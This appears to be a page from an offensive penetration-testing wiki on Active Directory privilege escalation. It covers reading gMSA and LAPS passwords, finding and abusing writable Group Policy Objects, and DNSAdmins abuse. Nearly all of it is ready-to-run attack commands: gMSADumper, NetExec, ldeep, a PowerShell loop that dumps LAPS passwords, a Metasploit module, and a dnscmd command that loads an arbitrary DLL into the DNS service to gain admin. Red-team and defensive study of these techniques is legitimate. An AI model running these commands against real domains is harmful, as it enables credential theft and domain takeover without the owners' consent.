# gMSA Laps and GPO

Some ACL edges lead to a stored secret rather than another object. Rights to read a gMSA password or a LAPS attribute hand you a credential directly; control over a GPO or the DNSAdmins role hands you code execution across everything they apply to.

## Why It Works

gMSA and LAPS passwords are stored in readable directory attributes protected only by an ACL. A GPO applies to every object in its linked scope, so write access to one GPO is write access to many machines at once.

## Prerequisites

* Read rights on the gMSA/LAPS attribute, or control over a GPO or DNS
* Any valid domain credential

## Execution

**ReadGMSAPassword**

* `gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'` [\[tool\]](https://github.com/micahvandeusen/gMSADumper)
* `nxc ldap <ip> -u <user> -p <pass> --gmsa` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
* `ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa` [\[tool\]](https://github.com/franc-pentest/ldeep)

**Get LAPS passwords**

* Who can read LAPS
  * `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p` [\[tool\]](https://github.com/SpecterOps/BloodHound)
* Read LAPS
  * `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize` [\[tool\]](https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps)
  * `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps` [\[tool\]](https://github.com/franc-pentest/ldeep)
  * `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
    * **→ Admin**
  * `nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * `msf> use post/windows/gather/credentials/enum_laps` [\[tool\]](https://docs.metasploit.com/)

**GPO**

* Who can control GPOs
  * `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p` [\[tool\]](https://github.com/SpecterOps/BloodHound)
* SID of principals that can create new GPOs in the domain
  * `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl` [\[tool\]](https://github.com/PowerShellMafia/PowerSploit)
* Return the principals that can write to the GP-Link attribute on OUs
  * `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl` [\[tool\]](https://github.com/PowerShellMafia/PowerSploit)
* Generic Write on GPO
  * Abuse GPO
    * **→ ACCESS**

**DNS Admin**

* **→ DNSadmins abuse (CVE-2021-40469)**
  * `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user` [\[tool\]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
  * `sc \\DNSServer stop dns sc \\DNSServer start dns` [\[tool\]](https://learn.microsoft.com/en-us/windows/win32/services/controlling-a-service-using-sc)
    * **→ Admin**

## Related

* [Rights on Users & Groups](file:///9685693/acl-abuse/rights-on-users-and-groups.md) — the edges that grant these read rights
* [Remote Execution](file:///9685693/lateral-movement/remote-execution.md) — cashing in GPO-based execution
